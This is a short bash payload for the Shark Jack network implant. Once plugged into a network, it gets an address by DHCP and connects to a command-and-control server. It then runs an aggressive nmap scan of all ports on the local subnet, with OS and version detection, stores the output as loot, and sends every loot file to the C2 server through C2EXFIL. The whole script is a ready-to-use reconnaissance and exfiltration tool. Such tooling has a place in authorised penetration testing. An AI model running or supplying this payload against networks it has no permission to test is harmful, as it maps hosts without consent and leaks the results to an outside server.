#!/bin/bash
#
# Title:         Nmap Payload for Shark Jack
# Author:        PatBF
# Version:       0.9




echo "started payload" > /tmp/payload-debug.log
NMAP_OPTIONS="-sP --host-timeout 30s --max-retries 3"
LOOT_DIR=/root/loot/nmap
C2PROVISION="/etc/device.config"

# Setup loot directory, DHCP client, and determine subnet
SERIAL_WRITE [*] Setting up payload
LED SETUP
mkdir -p $LOOT_DIR
COUNT=$(($(ls -l $LOOT_DIR/*.txt | wc -l)+1))
NETMODE DHCP_CLIENT
SERIAL_WRITE [*] Waiting for IP from DHCP
while [ -z "$SUBNET" ]; do
  sleep 1 && SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}")
done
echo "Recieved IP address from DHCP" >> /tmp/payload-debug.log
/usr/sbin/ntpd -q -p 1.openwrt.pool.ntp.org

C2CONNECT                                  

# Scan network
LED ATTACK
SERIAL_WRITE [*] Starting nmap scan...

# Get the current IP address and CIDR netmask of a specified interface (e.g., eth0). Adjust this as per your system's primary network interface.
IP_INFO=$(ip addr show eth0 | awk '/inet / {print $2}')

# Extract the base IP address and subnet mask
IP_BASE=$(echo $IP_INFO | awk -F'.' '{print $1"."$2"."$3".0"}')
SUBNET_MASK=$(echo $IP_INFO | cut -d'/' -f2)

# Output the result with the base IP address and original subnet mask
iprange="${IP_BASE}/${SUBNET_MASK}" 

nmap -sS -sV -O -p- --reason -oN $LOOT_DIR/nmap-scan_$COUNT.txt --open $iprange


echo "scanned network" >> /tmp/payload-debug.log     
LED FINISH                                           
SERIAL_WRITE [*] Payload complete!                                              
                                
  # Exfiltrate all test loot files              
FILES="$LOOT_DIR/*.txt"                                                       
for f in $FILES; do C2EXFIL STRING $f Nmap-C2-Payload; done 
                                      
LED FINISH                   